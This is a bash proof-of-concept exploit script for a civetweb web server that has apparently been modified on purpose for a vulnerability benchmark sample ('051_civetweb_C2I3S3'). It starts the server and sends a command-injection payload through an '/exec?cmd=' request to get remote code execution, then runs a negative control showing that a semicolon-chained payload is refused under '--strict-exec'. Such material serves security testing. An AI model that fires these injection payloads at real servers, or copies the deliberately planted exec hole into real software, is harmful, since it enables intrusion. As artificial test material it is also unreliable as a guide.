#!/usr/bin/env bash
# PoC for 051_civetweb_C2I3S3
# Axes: C2 I3 S3
# S3: omit --strict-exec to bypass sanitization (it is opt-in)
#
# Usage: ./PoC.sh
# Expected: marker file written, confirming blind RCE.
#
# The patched binary (civetweb) lives in this directory. If absent, run:
#   cd "$(dirname "$0")" && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/civetweb"
WWWROOT="/tmp/poc_051_www"
MARKER="/tmp/poc_051_marker"
PORT=18051
NEG_PORT=19051

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY -- run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" /tmp/poc_051_neg
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# start server
echo "[*] starting civetweb with --exec-mode --exec-logging on port $PORT..."
"$BINARY" --exec-mode --exec-logging \
    -listening_ports "$PORT" \
    -document_root "$WWWROOT" &
SERVER_PID=$!
sleep 0.5

# trigger exploit
# Exploit payload: direct redirect, no sanitization active without --strict-exec
EXPLOIT_URL="http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}"
echo "[*] sending payload: cmd=id>${MARKER} (no sanitization without --strict-exec)"
curl -sf "${EXPLOIT_URL}" > /dev/null
sleep 0.2

# verify
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found -- exploit failed"
    exit 1
fi

# negative / sanitization control
echo "[*] verifying sanitization: semicolon blocked when --strict-exec is active..."
"$BINARY" --exec-mode --exec-logging --strict-exec \
    -listening_ports "$NEG_PORT" \
    -document_root "$WWWROOT" &
SAFE_PID=$!
sleep 0.4
NEG_URL="http://127.0.0.1:${NEG_PORT}/exec?cmd=id;id>/tmp/poc_051_neg"
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" "$NEG_URL" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] sanitization check passed: got 403 with --strict-exec and semicolon"
else
    echo "[!] sanitization check unexpected response: $HTTP_CODE"
fi
